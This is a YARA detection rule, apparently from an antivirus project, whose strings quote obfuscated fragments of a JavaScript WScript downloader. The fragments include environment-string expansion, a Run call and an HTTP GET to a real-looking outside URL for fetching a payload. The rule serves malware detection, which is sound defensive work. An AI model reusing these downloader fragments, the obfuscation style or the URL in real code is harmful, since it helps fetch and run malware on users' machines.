rule sig_20160428_0cb13bce63f120f5113270f28a830981 {
  meta:
    description = "datamaliciousorder - file 20160428_0cb13bce63f120f5113270f28a830981.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bdc9da6b1f2a4c3e639808bed080766ca091b6bcb31513e0960a2ae0cd9f97d0"

  strings:
    $s1  = "function UrcNrvHqfTvpJfhIvpUtp() {return HgtRkkHcbSpdGutBtyYwd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function VkfXfiJfqHjqOouBzmLlg(FllYjlQplUidZbfEmaXby){HgtRkkHcbSpdGutBtyYwd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VkfXfiJfqHjqOouBzmLlg(FllYjlQplUidZbfEmaXby){HgtRkkHcbSpdGutBtyYwd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return FqqNagGdkHgkNhcNzxWpj - ZsgYgsGiyKhdWziSoyEue;};" fullword ascii
    $s5  = "var HgtRkkHcbSpdGutBtyYwd = function BwoOxeMyrFunBoaOcsDwa() {return QssDrzHttInvKzzXltIen[XjuUujPsvYgeUrmAicGrk](\"WScript\"+\"" ascii
    $s6  = "function XhfAtvJtqXptRuyRstCgc(FqqNagGdkHgkNhcNzxWpj, ZsgYgsGiyKhdWziSoyEue){FdpAknPqnWmjUtiZhjHxa = FdpAknPqnWmjUtiZhjHxa * 1; " ascii
    $s7  = "var HgtRkkHcbSpdGutBtyYwd = function BwoOxeMyrFunBoaOcsDwa() {return QssDrzHttInvKzzXltIen[XjuUujPsvYgeUrmAicGrk](\"WScript\"+\"" ascii
    $s8  = "var QssDrzHttInvKzzXltIen = this[\"WScript\"];" fullword ascii
    $s9  = "function BpfNrsPyhBjuLekFraYht(PqqPlbHhhNqwGvcCifThr) {var DvjUxiRerJmjWkwEejKgy = (1, 2, 3, 4, 5, PqqPlbHhhNqwGvcCifThr); retur" ascii
    $s10 = "function BpfNrsPyhBjuLekFraYht(PqqPlbHhhNqwGvcCifThr) {var DvjUxiRerJmjWkwEejKgy = (1, 2, 3, 4, 5, PqqPlbHhhNqwGvcCifThr); retur" ascii
    $s11 = "function UrcNrvHqfTvpJfhIvpUtp() {return HgtRkkHcbSpdGutBtyYwd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "function ZdjTvoPpwQrbWusHycQkc(){return XtgXyvUnbApuRptOpyAjr + \"\";};" fullword ascii
    $s13 = "function XhfAtvJtqXptRuyRstCgc(FqqNagGdkHgkNhcNzxWpj, ZsgYgsGiyKhdWziSoyEue){FdpAknPqnWmjUtiZhjHxa = FdpAknPqnWmjUtiZhjHxa * 1; " ascii
    $s14 = "if (HlmGkbFqlBmqTefKisBhu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s15 = "function VokThbDvhGrcWbqBclHkr() {return ((VofHupSpqStbCqbZizRcs == true) && (VofHupSpqStbCqbZizRcs == IisFwsJstLgwTcrAtjZuf)) ?" ascii
    $s16 = "function VokThbDvhGrcWbqBclHkr() {return ((VofHupSpqStbCqbZizRcs == true) && (VofHupSpqStbCqbZizRcs == IisFwsJstLgwTcrAtjZuf)) ?" ascii
    $s17 = "HlmGkbFqlBmqTefKisBhu[ZnpJjgZrzLfyDxgPjwIbn](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s18 = "function CilPqaTpfViaWbeVzzDin(){return XjuUujPsvYgeUrmAicGrk;};" fullword ascii
    $s19 = "IisFwsJstLgwTcrAtjZuf = true; " fullword ascii
    $s20 = "}while (AkyDqnFbbVucOkoLjnBan);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}